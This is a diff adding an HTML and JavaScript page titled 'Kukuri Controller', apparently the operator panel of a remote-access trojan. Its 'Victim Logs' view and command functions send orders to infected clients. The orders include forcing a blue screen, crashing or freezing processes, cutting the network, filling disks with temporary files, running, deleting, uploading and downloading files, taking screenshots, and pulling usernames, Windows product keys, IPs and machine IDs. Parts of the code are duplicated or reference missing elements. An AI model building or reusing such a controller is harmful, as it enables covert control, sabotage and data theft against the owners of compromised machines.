@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kukuri Controller</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white min-h-screen">
+    <div class="container mx-auto px-4 py-8">
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-bold mb-2">Kukuri Controller</h1>
+            <p>Remote Command Center</p>
+        </div>
+
+        <!-- Command Section -->
+        <div class="bg-gray-800 rounded-lg p-6 mb-8">
+            <h2 class="text-2xl font-bold mb-4">Send Command</h2>
+            
+            <div class="mb-4">
+                <label for="clientSelect">Select Client:</label>
+                <select id="clientSelect" class="bg-gray-700 rounded p-2 w-full">
+                    <option value="">Loading clients...</option>
+                </select>
+            </div>
+
+            <!-- System Control Buttons -->
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+                <button class="bg-red-600 hover:bg-red-700 p-2 rounded" onclick="sendCommand('fatal')">Fatal Error</button>
+                <button class="bg-red-600 hover:bg-red-700 p-2 rounded" onclick="sendCommand('bsod')">BSoD</button>
+                <button class="bg-blue-600 hover:bg-blue-700 p-2 rounded" onclick="sendCommand('net-stop')">Net Stop</button>
+                <button class="bg-blue-600 hover:bg-blue-700 p-2 rounded" onclick="sendCommand('vol-up')">Volume Up</button>
+                <button class="bg-blue-600 hover:bg-blue-700 p-2 rounded" onclick="sendCommand('vol-down')">Volume Down</button>
+            </div>
+
+            <!-- Process Management -->
+            <div class="bg-gray-800 p-4 rounded-lg mb-6">
+                <h3 class="text-lg font-semibold mb-4">Process Management</h3>
+                <div class="flex gap-4">
+                    <input type="text" id="processName" placeholder="Process name" class="bg-gray-700 rounded p-2 flex-grow">
+                    <button class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded" onclick="sendCrashCommand()">Crash Process</button>
+                    <button class="bg-yellow-600 hover:bg-yellow-700 px-4 py-2 rounded" onclick="sendWhiteScreenCommand()">Freeze Process</button>
+                    <button class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded" onclick="unfreezeProcess()">Unfreeze Process</button>
+                </div>
+            </div>
+
+            <!-- File Management -->
+            <div class="bg-gray-800 p-4 rounded-lg mb-6">
+                <h3 class="text-lg font-semibold mb-4">File Management</h3>
+                
+                <!-- Run file -->
+                <div class="flex gap-4 mb-4">
+                    <input type="text" id="runFilePath" placeholder="File path to run" 
+                           class="bg-gray-700 rounded p-2 flex-grow">
+                    <button onclick="runFile()" 
+                            class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded">
+                        Run File
+                    </button>
+                </div>
+
+                <!-- List และ Delete -->
+                <div class="flex gap-4 mb-4">
+                    <input type="text" id="directoryPath" placeholder="Directory path" class="bg-gray-700 rounded p-2 flex-grow">
+                    <button class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded" onclick="listFiles()">List Files</button>
+                    <button class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded" onclick="deleteFile()">Delete</button>
+                </div>
+
+                <!-- Move Files -->
+                <div class="flex gap-4 mb-4">
+                    <input type="text" id="sourcePath" placeholder="Source path" class="bg-gray-700 rounded p-2 flex-grow">
+                    <input type="text" id="destinationPath" placeholder="Destination path" class="bg-gray-700 rounded p-2 flex-grow">
+                    <button class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded" onclick="moveFile()">Move File</button>
+                </div>
+
+                <!-- Upload/Download -->
+                <div class="flex gap-4">
+                    <input type="text" id="filePath" placeholder="File path" class="bg-gray-700 rounded p-2 flex-grow">
+                    <input type="file" id="fileInput" class="hidden">
+                    <button class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded" onclick="triggerFileUpload()">Upload</button>
+                    <button class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded" onclick="downloadFile()">Download</button>
+                </div>
+            </div>
+
+            <!-- Temp Files -->
+            <div class="bg-gray-800 p-4 rounded-lg">
+                <h3 class="text-lg font-semibold mb-4">Temporary Files</h3>
+                <div class="flex gap-4">
+                    <input type="text" id="tempSize" placeholder="Size (e.g. 1GB, 500MB)" class="bg-gray-700 rounded p-2 flex-grow">
+                    <button class="bg-yellow-600 hover:bg-yellow-700 px-4 py-2 rounded" onclick="sendTempCommand()">Create Temp Files</button>
+                </div>
+            </div>
+
+        <!-- Logs Section -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
+            <div class="bg-gray-800 rounded-lg p-6">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-2xl font-bold">Command Logs</h2>
+                    <button class="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-sm" onclick="clearLogs()">Clear Logs</button>
+                </div>
+                <div id="commandLogs" class="bg-gray-700 rounded p-4 h-80 overflow-y-auto font-mono text-sm"></div>
+            </div>
+
+            <div class="bg-gray-800 rounded-lg p-6">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-2xl font-bold">Victim Logs</h2>
+                </div>
+                <div id="victimLogs" class="bg-gray-700 rounded p-4 h-80 overflow-y-auto font-mono text-sm"></div>
+            </div>
+        </div>
+
+        <!-- System Info Section -->
+        <div class="bg-gray-800 rounded-lg p-6 mb-8">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-2xl font-bold">System Information</h2>
+                <button onclick="getSystemInfo()" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded">
+                    Get Info
+                </button>
+            </div>
+            
+            <div id="systemInfo" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <!-- User Information Card -->
+                <div class="bg-gray-700 p-4 rounded">
+                    <h3 class="font-semibold mb-2 text-blue-400">User Information</h3>
+                    <div class="space-y-2">
+                        <p>Username: <span id="userUsername" class="text-gray-300">-</span></p>
+                        <p>RID: <span id="userRID" class="text-gray-300">-</span></p>
+                    </div>
+                </div>
+
+                <!-- System Information Card -->
+                <div class="bg-gray-700 p-4 rounded">
+                    <h3 class="font-semibold mb-2 text-blue-400">System Information</h3>
+                    <div class="space-y-2">
+                        <p>OS: <span id="systemOS" class="text-gray-300">-</span></p>
+                        <p>Product Key: <span id="systemKey" class="text-gray-300">-</span></p>
+                    </div>
+                </div>
+
+                <!-- Network Information Card -->
+                <div class="bg-gray-700 p-4 rounded">
+                    <h3 class="font-semibold mb-2 text-blue-400">Network Information</h3>
+                    <div class="space-y-2">
+                        <p>IP Address: <span id="networkIP" class="text-gray-300">-</span></p>
+                        <p>Machine ID: <span id="networkMID" class="text-gray-300">-</span></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- File Tree Modal -->
+        <div id="fileTreeModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+            <div class="bg-gray-800 rounded-lg p-6 w-3/4 max-h-[80vh] overflow-hidden">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-2xl font-bold">File Tree</h2>
+                    <button onclick="closeFileTreeModal()" class="text-gray-400 hover:text-white">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </button>
+                </div>
+                <div id="fileTreeContent" class="overflow-auto max-h-[60vh] font-mono">
+                    <!-- File tree will be inserted here -->
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <script>
+        let selectedClient = '';
+        let refreshInterval;
+
+        function showFileTreeModal() {
+            document.getElementById('fileTreeModal').classList.remove('hidden');
+        }
+
+        async function sendWhiteScreenCommand() {
+            const processName = document.getElementById('processName').value;
+            if (!processName) {
+                alert('Please enter a process name');
+                return;
+            }
+            await sendCommand(`ws ${processName}`);
+        }
+
+        async function unfreezeProcess() {
+            const processName = document.getElementById('processName').value;
+            if (!processName) {
+                alert('Please enter a process name');
+                return;
+            }
+            await sendCommand(`unws ${processName}`);
+        }
+
+        async function runFile() {
+            const filePath = document.getElementById('runFilePath').value;
+            if (!filePath) {
+                alert('Please enter a file path');
+                return;
+            }
+
+            const ext = filePath.split('.').pop().toLowerCase();
+            if (['exe', 'bat', 'cmd'].includes(ext)) {
+                if (!confirm('Warning: Running executable files can be dangerous. Are you sure?')) {
+                    return;
+                }
+            }
+
+            await sendCommand(`run ${filePath}`);
+        }
+
+        function closeFileTreeModal() {
+            document.getElementById('fileTreeModal').classList.add('hidden');
+        }
+
+        function createFileTreeHTML(item, indent = 0) {
+            const padding = '  '.repeat(indent);
+            let html = '';
+        
+            if (item.type === 'directory') {
+                html += `
+                    <div class="group flex items-center py-1 hover:bg-gray-700 cursor-pointer">
+                        <span class="text-yellow-500">
+                            ${padding}📁 ${item.name}/
+                        </span>
+                        <div class="hidden group-hover:flex ml-2 gap-2">
+                            <button onclick="deleteFile('${item.fullPath}')" 
+                                    class="text-red-400 hover:text-red-500" 
+                                    title="Delete folder">
+                                🗑️
+                            </button>
+                        </div>
+                    </div>
+                `;
+                if (item.children) {
+                    item.children.forEach(child => {
+                        html += createFileTreeHTML(child, indent + 1);
+                    });
+                }
+            } else {
+                const fileIcon = getFileIcon(item.name);
+                html += `
+                    <div class="group flex items-center py-1 hover:bg-gray-700">
+                        <span class="text-blue-400 flex-grow">
+                            ${padding}${fileIcon} ${item.name}
+                        </span>
+                        <span class="text-gray-500 text-sm mr-2">
+                            ${formatFileSize(item.size)}
+                        </span>
+                        <div class="hidden group-hover:flex gap-2">
+                            <button onclick="runFile('${item.fullPath}')" 
+                                    class="text-green-400 hover:text-green-500" 
+                                    title="Run file">
+                                ▶️
+                            </button>
+                            <button onclick="downloadFile('${item.fullPath}')" 
+                                    class="text-blue-400 hover:text-blue-500" 
+                                    title="Download file">
+                                ⬇️
+                            </button>
+                            <button onclick="deleteFile('${item.fullPath}')" 
+                                    class="text-red-400 hover:text-red-500" 
+                                    title="Delete file">
+                                🗑️
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+        
+            return html;
+        }
+
+        function getFileIcon(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            const icons = {
+                pdf: '📄',
+                doc: '📄',
+                docx: '📄',
+                txt: '📝',
+                jpg: '🖼️',
+                jpeg: '🖼️',
+                png: '🖼️',
+                gif: '🖼️',
+                mp4: '🎥',
+                mp3: '🎵',
+                zip: '📦',
+                rar: '📦',
+                default: '📄'
+            };
+            return icons[ext] || icons.default;
+        }
+
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // Utility Functions
+        function showLoading() {
+            document.getElementById('loadingIndicator').classList.remove('hidden');
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingIndicator').classList.add('hidden');
+        }
+
+        async function getSystemInfo() {
+            const client = document.getElementById('clientSelect').value;
+            if (!client) {
+                alert('Please select a client first');
+                return;
+            }
+
+            try {
+                showLoading('Getting system information...');
+                addCommandLog('Requesting system information for ' + client);
+                
+                const response = await fetch('/api/systeminfo/' + client);
+                const data = await response.json();
+                
+                if (data.status === 'success' && data.data) {
+                    const info = data.data;
+                    document.getElementById('userUsername').textContent = info.username || 'N/A';
+                    document.getElementById('userRID').textContent = info.rid || 'N/A';
+                    document.getElementById('systemOS').textContent = info.windowsVersion || 'N/A';
+                    document.getElementById('systemKey').textContent = info.windowsKey || 'N/A';
+                    document.getElementById('networkIP').textContent = info.ipAddress || 'N/A';
+                    document.getElementById('networkMID').textContent = info.machineID || 'N/A';
+                    
+                    addCommandLog('Successfully retrieved system information');
+                } else {
+                    addCommandLog('Failed to get system information: ' + (data.message || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error getting system info:', error);
+                addCommandLog('Error getting system information: ' + error.message);
+            } finally {
+                hideLoading();
+            }
+        }
+
+        async function updateSystemInfo(username) {
+            try {
+                const response = await fetch(`/api/systeminfo/${username}`);
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    const info = data.data;
+                    document.getElementById('userUsername').textContent = info.username;
+                    document.getElementById('userRID').textContent = info.rid;
+                    document.getElementById('systemOS').textContent = info.windowsVersion;
+                    document.getElementById('systemKey').textContent = info.windowsKey;
+                    document.getElementById('networkIP').textContent = info.ipAddress;
+                    document.getElementById('networkID').textContent = info.machineID;
+                }
+            } catch (error) {
+                console.error('Error fetching system info:', error);
+            }
+        }
+
+        function showLoading(message) {
+            const loadingDiv = document.getElementById('loadingIndicator');
+            if (loadingDiv) {
+                loadingDiv.classList.remove('hidden');
+                const loadingText = loadingDiv.querySelector('span');
+                if (loadingText) {
+                    loadingText.textContent = message;
+                }
+            }
+        }
+
+        function hideLoading() {
+            const loadingDiv = document.getElementById('loadingIndicator');
+            if (loadingDiv) {
+                loadingDiv.classList.add('hidden');
+            }
+        }
+
+        async function uploadFile() {
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            
+            fileInput.onchange = async (e) => {
+                const file = e.target.files[0];
+                const remotePath = document.getElementById('uploadPath').value;
+                
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('path', remotePath);
+                
+                await fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+            };
+            
+            fileInput.click();
+        }
+
+        async function downloadFile() {
+            const filePath = document.getElementById('filePath').value;
+            if (!filePath) {
+                alert('Please enter a file path');
+                return;
+            }
+
+            try {
+                const response = await fetch('/download', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ path: filePath })
+                });
+
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = filePath.split('/').pop();
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                    addCommandLog(`Successfully downloaded file from ${filePath}`);
+                } else {
+                    const error = await response.json();
+                    addCommandLog(`Failed to download file: ${error.error}`);
+                }
+            } catch (error) {
+                addCommandLog(`Error downloading file: ${error.message}`);
+            }
+        }
+
+        async function listFiles() {
+            const directoryPath = document.getElementById('directoryPath').value;
+            if (!directoryPath) {
+                alert('Please enter a directory path');
+                return;
+            }
+
+            try {
+                const response = await fetch(`/api/files/list?path=${encodeURIComponent(directoryPath)}`);
+                const data = await response.json();
+
+                if (data.success) {
+                    const fileTreeHTML = createFileTreeHTML({
+                        type: 'directory',
+                        name: directoryPath.split('/').pop() || directoryPath,
+                        children: data.files
+                    });
+                    document.getElementById('fileTreeContent').innerHTML = fileTreeHTML;
+                    showFileTreeModal();
+                } else {
+                    addCommandLog(`Failed to list files: ${data.error}`);
+                }
+            } catch (error) {
+                addCommandLog(`Error listing files: ${error.message}`);
+            }
+        }
+        document.getElementById('fileTreeModal').addEventListener('click', (e) => {
+            if (e.target === e.currentTarget) {
+                closeFileTreeModal();
+            }
+        });
+
+        async function deleteFile() {
+            const filePath = document.getElementById('filePath').value;
+            if (!filePath) {
+                alert('Please enter a file path');
+                return;
+            }
+            if (confirm(`Are you sure you want to delete: ${filePath}?`)) {
+                await sendCommand(`delete ${filePath}`);
+            }
+        }
+
+        async function moveFile() {
+            const sourcePath = document.getElementById('sourcePath').value;
+            const destinationPath = document.getElementById('destinationPath').value;
+            if (!sourcePath || !destinationPath) {
+                alert('Please enter both source and destination paths');
+                return;
+            }
+            await sendCommand(`move ${sourcePath} ${destinationPath}`);
+        }
+
+        function triggerFileUpload() {
+            document.getElementById('fileInput').click();
+        }
+
+        document.getElementById('fileInput').addEventListener('change', async (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            const filePath = document.getElementById('filePath').value;
+            if (!filePath) {
+                alert('Please enter a destination path');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('path', filePath);
+
+            try {
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                    
+                if (result.success) {
+                    addCommandLog(`Successfully uploaded file to ${filePath}`);
+                } else {
+                    addCommandLog(`Failed to upload file: ${result.error}`);
+                }
+            } catch (error) {
+                addCommandLog(`Error uploading file: ${error.message}`);
+            }
+        });
+
+        async function sendCommand(command) {
+            const client = document.getElementById('clientSelect').value;
+            if (!client) {
+                alert('Please select a client first');
+                return;
+            }
+
+            try {
+                const response = await fetch('/setcommand', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: client,
+                        command: command
+                    })
+                });
+
+                const data = await response.json();
+                addCommandLog(`Sent command '${command}' to ${client}`);
+            } catch (error) {
+                console.error('Error sending command:', error);
+                addCommandLog(`Error sending command '${command}' to ${client}`);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelector('[data-action="upload"]').onclick = uploadFile;
+            document.querySelector('[data-action="download"]').onclick = downloadFile;
+            document.querySelector('[data-action="list"]').onclick = listFiles;
+            document.querySelector('[data-action="delete"]').onclick = deleteFile;
+            document.querySelector('[data-action="move"]').onclick = moveFile;
+        });
+
+        // Client Management
+        async function loadClients() {
+            try {
+                const response = await fetch('/api/clients');
+                const data = await response.json();
+                const select = document.getElementById('clientSelect');
+                select.innerHTML = '<option value="">Select a client...</option>';
+                
+                data.clients.forEach(client => {
+                    const option = document.createElement('option');
+                    option.value = client;
+                    option.textContent = client;
+                    select.appendChild(option);
+                });
+            } catch (error) {
+                console.error('Error loading clients:', error);
+                addCommandLog('Error loading clients');
+            }
+        }
+
+        // Command Functions
+        async function sendCommand(command) {
+            const client = document.getElementById('clientSelect').value;
+            if (!client) {
+                alert('Please select a client first');
+                return;
+            }
+
+            try {
+                const response = await fetch('/setcommand', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: client,
+                        command: command
+                    })
+                });
+
+                const data = await response.json();
+                addCommandLog(`Sent command '${command}' to ${client}`);
+            } catch (error) {
+                console.error('Error sending command:', error);
+                addCommandLog(`Error sending command '${command}' to ${client}`);
+            }
+        }
+
+        async function sendWhiteScreenCommand() {
+            const processName = document.getElementById('processName').value;
+            if (!processName) {
+                alert('Please enter a process name');
+                return;
+            }
+            await sendCommand(`ws ${processName}`);
+        }
+
+        async function sendCrashCommand() {
+            const processName = document.getElementById('processName').value;
+            if (!processName) {
+                alert('Please enter a process name');
+                return;
+            }
+            await sendCommand(`crash ${processName}`);
+        }
+
+        async function sendTempCommand() {
+            const size = document.getElementById('tempSize').value;
+            if (!size) {
+                alert('Please enter a size');
+                return;
+            }
+            await sendCommand(`create-temp ${size}`);
+        }
+
+        async function takeScreenshot() {
+            const client = document.getElementById('clientSelect').value;
+            if (!client) {
+                alert('Please select a client first');
+                return;
+            }
+
+            showLoading();
+            try {
+                console.log(`Sending screenshot command to client: ${client}`);
+                await sendCommand('screenshot');
+
+                let attempts = 0;
+                const maxAttempts = 10;
+                const retryDelay = 1000;
+
+                while (attempts < maxAttempts) {
+                    console.log(`Attempt ${attempts + 1} to fetch screenshot`);
+                    const response = await fetch(`/screenshot/${client}`);
+                    const data = await response.json();
+
+                    if (data.status === 'success' && data.data && data.data.image) {
+                        console.log('Screenshot fetched successfully:', data);
+                        updateScreenshotDisplay(data.data);
+                        addCommandLog('Screenshot captured successfully');
+                        hideLoading();
+                        return;
+                    }
+
+                    console.log('Screenshot not ready, retrying...');
+                    attempts++;
+                    await new Promise(resolve => setTimeout(resolve, retryDelay));
+                }
+
+                addCommandLog('Failed to fetch screenshot after multiple attempts');
+            } catch (error) {
+                console.error('Error taking screenshot:', error);
+                addCommandLog('Error taking screenshot');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        function updateScreenshotDisplay(data) {
+            const container = document.getElementById('screenshotContainer');
+            const img = document.getElementById('screenshotImage');
+            const noMessage = document.getElementById('noScreenshotMessage');
+            const timeDisplay = document.getElementById('screenshotTime');
+
+            if (data && data.image) {
+                console.log('Displaying screenshot');
+                const imageSrc = `data:image/png;base64,${data.image}`;
+                img.src = imageSrc;
+                img.onload = () => {
+                    img.classList.remove('hidden');
+                    noMessage.classList.add('hidden');
+                };
+                img.onerror = () => {
+                    console.error('Error loading image');
+                    noMessage.classList.remove('hidden');
+                };
+
+                if (data.timestamp) {
+                    timeDisplay.textContent = `Captured at: ${new Date(data.timestamp).toLocaleTimeString()}`;
+                }
+            } else {
+                console.error('No image data available');
+                img.classList.add('hidden');
+                noMessage.classList.remove('hidden');
+                timeDisplay.textContent = '';
+            }
+        }
+
+        // Log Management
+        function addCommandLog(message) {
+            const logs = document.getElementById('commandLogs');
+            const time = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.textContent = `[${time}] ${message}`;
+            logs.appendChild(logEntry);
+            logs.scrollTop = logs.scrollHeight;
+        }
+
+        async function clearLogs() {
+            try {
+                await fetch('/api/logs/clear', { method: 'POST' });
+                document.getElementById('commandLogs').innerHTML = '';
+                document.getElementById('victimLogs').innerHTML = '';
+                addCommandLog('Logs cleared');
+            } catch (error) {
+                console.error('Error clearing logs:', error);
+                addCommandLog('Error clearing logs');
+            }
+        }
+
+        // Update Functions
+        async function updateVictimLogs() {
+            try {
+                const response = await fetch('/api/logs/victim');
+                const data = await response.json();
+                const logsContainer = document.getElementById('victimLogs');
+                logsContainer.innerHTML = '';
+                
+                data.logs.forEach(log => {
+                    const logEntry = document.createElement('div');
+                    logEntry.textContent = log;
+                    logsContainer.appendChild(logEntry);
+                });
+            } catch (error) {
+                console.error('Error updating victim logs:', error);
+            }
+        }
+
+        // Initialization
+        window.onload = function() {
+            loadClients();
+            
+            refreshInterval = setInterval(() => {
+                updateVictimLogs();
+            }, 5000);
+            
+            document.getElementById('clientSelect').addEventListener('change', function(e) {
+                const username = e.target.value;
+                if (username) {
+                    updateSystemInfo(username);
+                }
+            });
+            
+        };
+
+        // Cleanup
+        window.onbeforeunload = function() {
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+            }
+        };
+    </script>
+</body>
+</html>
